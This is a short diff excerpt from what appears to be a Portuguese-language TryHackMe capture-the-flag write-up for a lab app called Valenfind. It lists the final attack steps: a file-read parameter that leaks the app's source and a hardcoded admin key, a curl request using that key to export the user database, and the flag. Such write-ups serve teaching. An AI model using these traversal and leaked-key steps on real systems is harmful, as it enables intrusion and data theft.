@@ -190,3 +190,5 @@ THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}
 5. **`layout=/opt/Valenfind/app.py`** → vaza o código-fonte completo, expondo `ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"` hardcoded
 6. **`curl -H 'X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO' /api/admin/export_db`** → download completo do banco `cupid.db`
 7. **`sqlite3` dump da tabela `users`** → flag encontrada no campo `address` do usuário `cupid`: `THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}`
+
+---
